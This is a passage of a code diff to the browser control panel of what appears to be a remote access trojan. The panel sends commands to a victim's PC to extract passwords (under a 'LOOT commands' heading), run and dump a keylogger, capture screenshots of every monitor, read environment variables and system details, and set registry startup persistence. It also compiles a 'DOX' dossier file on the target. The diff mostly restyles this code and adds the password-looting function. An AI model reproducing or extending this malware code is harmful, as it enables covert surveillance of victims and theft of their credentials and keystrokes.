-async function loadNet(){const el=document.getElementById('netOut');const ee=document.getElementById('netErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading net...</div>';const r=await saw('network_info','',el,'netErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
-async function loadSvc(){const el=document.getElementById('svcOut');const ee=document.getElementById('svcErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading services...</div>';const r=await saw('services','',el,'svcErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>';const l=r.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME'));document.getElementById('svcCnt').textContent='~'+l.length+' svcs'}}
-async function loadApps(){const el=document.getElementById('appOut');const ee=document.getElementById('appErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Listing apps...</div>';const r=await saw('installed_apps','',el,'appErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+// === LOOT commands ===
+async function loadPW(){const el=document.getElementById('pwOut');const ee=document.getElementById('pwErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Extracting...</div>';const r=await saw('passwords','',el,'pwErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>';toast('Passwords extracted')}}
+async function loadNet(){const el=document.getElementById('netOut');const ee=document.getElementById('netErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading net...</div>';const r=await saw('network_info','',el,'netErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
+async function loadSvc(){const el=document.getElementById('svcOut');const ee=document.getElementById('svcErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading services...</div>';const r=await saw('services','',el,'svcErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>';const l=r.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME'));document.getElementById('svcCnt').textContent='~'+l.length+' svcs'}}
+async function loadApps(){const el=document.getElementById('appOut');const ee=document.getElementById('appErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Listing apps...</div>';const r=await saw('installed_apps','',el,'appErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
 
 // === Files ===
 let g_fp='',g_fl=false;
@@ -581,38 +512,38 @@ function handleDrop(e){e.preventDefault();document.getElementById('dropZ').class
 function handleFP(i){for(let f of i.files)upFile(f);i.value=''}
 
 // === Host Info ===
-async function loadHost(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading host...</div>';const r=await saw('host_info','',el,'hostErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('hostGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+esc(d.user||'?')+'</div><div class="l">User</div></div>';h+='<div class="card"><div class="v">'+esc(d.os||'?')+'</div><div class="l">OS</div></div>';h+='<div class="card"><div class="v">'+esc(d.arch||'?')+'</div><div class="l">Arch</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';h+='<div class="card"><div class="v">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="l">Uptime</div></div>';if(d.gpus)h+='<div class="card"><div class="v" style="font-size:.85rem">'+esc(d.gpus)+'</div><div class="l">GPU</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f).toFixed(1)+' GB</div><div class="l">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--grn)">✓ Host info loaded</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
-async function loadEnv(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading env...</div>';const r=await saw('env_vars','',el,'hostErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function loadHost(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading host...</div>';const r=await saw('host_info','',el,'hostErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('hostGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+esc(d.user||'?')+'</div><div class="l">User</div></div>';h+='<div class="card"><div class="v">'+esc(d.os||'?')+'</div><div class="l">OS</div></div>';h+='<div class="card"><div class="v">'+esc(d.arch||'?')+'</div><div class="l">Arch</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';h+='<div class="card"><div class="v">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="l">Uptime</div></div>';if(d.gpus)h+='<div class="card"><div class="v" style="font-size:.85rem">'+esc(d.gpus)+'</div><div class="l">GPU</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f).toFixed(1)+' GB</div><div class="l">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">✓ Host info loaded</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function loadEnv(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading env...</div>';const r=await saw('env_vars','',el,'hostErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
 async function takeSSAll(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Capturing...</div>';const r=await saw('screenshot_all','',el,'hostErr');if(r&&r.result){const parts=r.result.split('===MON:');parts.forEach((p,i)=>{if(i===0)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+p+'">';else{const m=p.split('===\n');el.innerHTML+='<div class="smol">Mon '+m[0]+'</div><img class="img-out" src="data:image/jpeg;base64,'+m[1]+'">'}})}}
 
 // === Keylogger ===
-async function startKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Starting...</div>';const r=await saw('keylog_start','',el,'klErr');if(r){document.getElementById('klStart').style.display='none';document.getElementById('klStop').style.display='';document.getElementById('klStat').textContent='● Running';el.innerHTML='<div style="color:var(--grn)">Keylogger started</div>';toast('Keylogger started')}}
-async function stopKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';const r=await saw('keylog_stop','',el,'klErr');if(r){document.getElementById('klStart').style.display='';document.getElementById('klStop').style.display='none';document.getElementById('klStat').textContent='Stopped';el.innerHTML='<div style="color:var(--grn)">Stopped</div>'}}
-async function dumpKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Dumping...</div>';const r=await saw('keylog_dump','',el,'klErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>'}
+async function startKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Starting...</div>';const r=await saw('keylog_start','',el,'klErr');if(r){document.getElementById('klStart').style.display='none';document.getElementById('klStop').style.display='';document.getElementById('klStat').textContent='● Running';el.innerHTML='<div style="color:var(--green)">Keylogger started</div>';toast('Keylogger started')}}
+async function stopKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';const r=await saw('keylog_stop','',el,'klErr');if(r){document.getElementById('klStart').style.display='';document.getElementById('klStop').style.display='none';document.getElementById('klStat').textContent='Stopped';el.innerHTML='<div style="color:var(--green)">Stopped</div>'}}
+async function dumpKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Dumping...</div>';const r=await saw('keylog_dump','',el,'klErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem;line-height:1.4">'+esc(r.result)+'</pre>'}
 
 // === Activity Log ===
-async function loadLog(){const el=document.getElementById('logOut');const ee=document.getElementById('logErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.7rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--txt2)">'+t+'</span> <span style="color:var(--acc)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--txt2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch(e){el.innerHTML='<div class="loading">Error</div>'}}
+async function loadLog(){const el=document.getElementById('logOut');const ee=document.getElementById('logErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.68rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--text2)">'+t+'</span> <span style="color:var(--accent)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--text2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch(e){el.innerHTML='<div class="loading">Error</div>'}}
 
 // === Settings ===
 document.getElementById('setPCName').textContent=computer;
 async function loadSettings(){
   const el=document.getElementById('setErr');el.style.display='none';
   const r=await saw('startup_status','','setErr','setErr');
-  if(r&&r.result){try{const d=JSON.parse(r.result);const btn=document.getElementById('setStartupBtn');const txt=document.getElementById('setStartupTxt');if(d.enabled){btn.textContent='ON';btn.className='btn btn-g btn-sm';btn.style.background='var(--grn)';btn.style.color='#000';txt.textContent=d.active?'Running - will start on boot':'Registry set (path mismatch)';txt.style.color=d.active?'var(--grn)':'var(--ylw)'}else{btn.textContent='OFF';btn.className='btn btn-g btn-sm';btn.style.background='';btn.style.color='';txt.textContent='Not in startup';txt.style.color='var(--txt2)'}}catch{}}
+  if(r&&r.result){try{const d=JSON.parse(r.result);const btn=document.getElementById('setStartupBtn');const txt=document.getElementById('setStartupTxt');if(d.enabled){btn.textContent='ON';btn.className='btn btn-p btn-sm';txt.textContent=d.active?'Running - auto boot':'Registry set';txt.style.color=d.active?'var(--green)':'var(--orange)'}else{btn.textContent='OFF';btn.className='btn btn-g btn-sm';txt.textContent='Not in startup';txt.style.color='var(--text2)'}}catch{}}
   const p=document.getElementById('setPersistTxt');
-  p.textContent='Active (pid '+((window._myPid)||'?')+')';p.style.color='var(--grn)';
+  p.textContent='Active';p.style.color='var(--green)';
 }
 async function toggleStartup(){
   const btn=document.getElementById('setStartupBtn');
   const isOn=btn.textContent==='ON';
   const r=await saw(isOn?'startup_off':'startup_on','','setErr','setErr');
-  if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.style.background='var(--grn)';b.style.color='#000';t.textContent=d.active?'Running - will start on boot':'Registry set';t.style.color=d.active?'var(--grn)':'var(--ylw)'}else{b.textContent='OFF';b.style.background='';b.style.color='';t.textContent='Not in startup';t.style.color='var(--txt2)'}}catch{}}
+  if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.className='btn btn-p btn-sm';t.textContent=d.active?'Running':'Registry set';t.style.color=d.active?'var(--green)':'var(--orange)'}else{b.textContent='OFF';b.className='btn btn-g btn-sm';t.textContent='Not in startup';t.style.color='var(--text2)'}}catch{}}
 }
 async function uninstallClient(){
-  if(!confirm('UNINSTALL: This will remove the client from the remote PC and delete the exe. Continue?'))return;
-  if(!confirm('Are you REALLY sure? This cannot be undone.'))return;
+  if(!confirm('UNINSTALL: Remove the client from remote PC?'))return;
+  if(!confirm('Are you sure?'))return;
   await saw('uninstall','','setErr','setErr');
-  document.getElementById('setErr').textContent='Uninstall command sent - client will remove itself';
+  document.getElementById('setErr').textContent='Uninstall sent - client will self-delete';
   document.getElementById('setErr').style.display='';
 }
 async function setLiveMon(){const m=document.getElementById('setLiveMon').value;await saw('live_monitor',m,'setErr','setErr')}
@@ -640,42 +571,28 @@ async function runDox(){
   const selected=doxTasks.filter(t=>document.getElementById(t.id).checked);
   let results={};let done=0;
   const ts=new Date().toISOString().replace(/[:.]/g,'-');
-  log.innerHTML+='<div style="color:var(--acc)">Starting dossier collection for '+esc(computer)+'...</div>';
+  log.innerHTML+='<div style="color:var(--accent)">Starting dossier for '+esc(computer)+'...</div>';
   for(const task of selected){
     done++;bar.style.width=Math.round(done/selected.length*100)+'%';
     st.textContent=task.label+'...';
-    log.innerHTML+='<div style="color:var(--txt2)">├ '+esc(task.label)+': requesting...</div>';
+    log.innerHTML+='<div style="color:var(--text2)">├ '+esc(task.label)+': requesting...</div>';
     log.scrollTop=log.scrollHeight;
     try{
       const r=await saw(task.type,'',null,null);
-      if(r&&r.result){
-        results[task.label]=r.result;
-        log.innerHTML+='<div style="color:var(--grn)">├ '+esc(task.label)+': OK ('+r.result.length+' chars)</div>';
-      }else{
-        results[task.label]='(no data)';
-        log.innerHTML+='<div style="color:var(--ylw)">├ '+esc(task.label)+': empty</div>';
-      }
-    }catch(e){
-      results[task.label]='(error)';
-      log.innerHTML+='<div style="color:var(--red)">├ '+esc(task.label)+': error</div>';
-    }
+      if(r&&r.result){results[task.label]=r.result;log.innerHTML+='<div style="color:var(--green)">├ '+esc(task.label)+': OK ('+r.result.length+' chars)</div>'}
+      else{results[task.label]='(no data)';log.innerHTML+='<div style="color:var(--orange)">├ '+esc(task.label)+': empty</div>'}
+    }catch(e){results[task.label]='(error)';log.innerHTML+='<div style="color:var(--red)">├ '+esc(task.label)+': error</div>'}
     log.scrollTop=log.scrollHeight;
   }
   bar.style.width='100%';
-  log.innerHTML+='<div style="color:var(--grn);margin-top:4px">Done! Generating file...</div>';
-  let txt='';
-  txt+='═══════════════════════════════════════════════════════\n';
-  txt+='  TARGET DOSSIER: '+computer+'\n';
+  log.innerHTML+='<div style="color:var(--green);margin-top:4px">Done! Generating...</div>';
+  let txt='═══════════════════════════════════════════════════════\n';
+  txt+='  DOSSIER: '+computer+'\n';
   txt+='  Generated: '+new Date().toLocaleString()+'\n';
-  txt+='  IP: '+(document.getElementById('meta')?.textContent||'')+'\n';
   txt+='═══════════════════════════════════════════════════════\n\n';
   for(const[key,val]of Object.entries(results)){
-    txt+='┌─────────────────────────────────────────────────────┐\n';
-    txt+='│ '+key.toUpperCase().padEnd(51)+'│\n';
-    txt+='├─────────────────────────────────────────────────────┤\n';
-    const lines=(val||'').split('\n');
-    for(const line of lines){txt+='│ '+line.substring(0,51).padEnd(51)+'│\n';}
-    txt+='└─────────────────────────────────────────────────────┘\n\n';
+    txt+='--- '+key.toUpperCase()+' ---\n';
+    txt+=(val||'(empty)')+'\n\n';
   }
   txt+='═══════════════════════════════════════════════════════\n';
   txt+='  END OF DOSSIER\n';
@@ -685,48 +602,12 @@ async function runDox(){
   a.download='DOX_'+computer+'_'+ts+'.txt';
   a.click();URL.revokeObjectURL(a.href);
   st.textContent='Downloaded!';
-  log.innerHTML+='<div style="color:var(--grn)">✓ Dossier downloaded: DOX_'+esc(computer)+'_'+esc(ts)+'.txt</div>';
-  btn.disabled=false;btn.textContent='Generate Dossier';
+  log.innerHTML+='<div style="color:var(--green)">✓ Dossier saved</div>';
+  btn.disabled=false;btn.textContent='Generate';
   toast('Dossier downloaded');
 }
 
-// === INTEL ===
-async function loadIntel(){
-  const el=document.getElementById('intelOut');const ee=document.getElementById('intelErr');ee.style.display='none';
-  el.innerHTML='<div class="loading"><span class="sp"></span>Gathering intel...</div>';
-  let html='';
-  try{
-    const r=await saw('host_info','',null,null);
-    if(r&&r.result){
-      const d=JSON.parse(r.result);
-      html+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px">';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">HOSTNAME</div><div style="font-size:.85rem;color:var(--acc);font-weight:600">'+esc(d.host||'?')+'</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">USER</div><div style="font-size:.85rem;color:var(--acc);font-weight:600">'+esc(d.user||'?')+'</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">OS</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.os||'?')+'</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">ARCH</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.arch||'?')+'</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">CPU</div><div style="font-size:.85rem;color:#f0f4fc">'+(d.cores||'?')+' cores</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">RAM</div><div style="font-size:.85rem;color:#f0f4fc">'+(d.ram/1024).toFixed(1)+' GB</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">GPU</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.gpus||'?')+'</div></div>';
-      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">UPTIME</div><div style="font-size:.85rem;color:#f0f4fc">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div></div>';
-      html+='</div>';
-      if(d.disks&&d.disks.length){
-        html+='<div style="margin-bottom:8px">';
-        for(const dk of d.disks){
-          const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;
-          html+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:.75rem">';
-          html+='<span style="color:var(--txt2);min-width:30px">'+dk.d+'</span>';
-          html+='<div style="flex:1;background:rgba(255,255,255,.06);border-radius:3px;height:5px;overflow:hidden"><div style="width:'+pct+'%;height:100%;background:'+(pct>90?'var(--red)':'var(--grn)')+';border-radius:3px"></div></div>';
-          html+='<span style="color:var(--txt2);min-width:80px;text-align:right">'+dk.f.toFixed(1)+' / '+dk.t+' GB</span>';
-          html+='</div>';
-        }
-        html+='</div>';
-      }
-      el.innerHTML=html;
-    }else{el.innerHTML='<div class="loading">No host data</div>'}
-  }catch(e){el.innerHTML='<div class="loading">Error loading intel</div>'}
-}
-
-// === Util ===
+// === Toast ===
 function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
 
 // Init monitors
